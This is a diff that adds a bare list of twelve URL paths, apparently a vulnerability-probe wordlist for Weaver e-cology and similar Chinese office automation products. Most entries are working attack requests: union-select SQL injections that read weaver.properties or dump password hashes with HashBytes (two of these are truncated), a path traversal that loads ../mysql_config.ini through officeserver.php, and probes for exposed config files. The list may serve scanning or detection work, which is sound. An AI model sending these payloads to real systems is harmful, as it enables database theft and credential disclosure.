@@ -1,0 +1,12 @@
+/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini
+/login/VerifyGDLogin.jsp?para1=1&para2=2
+/api/encrypt/secondauthsetting/saveCAAuth
+/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27
+/mobile/plugin/CheckServer.jsp?type=mobileSetting
+/Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes(
+/Api/portal/elementEcodeAddon/getSqlData?sql=
+/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(
+/mysql_config.ini
+/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
+/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp
+/UserSelect/
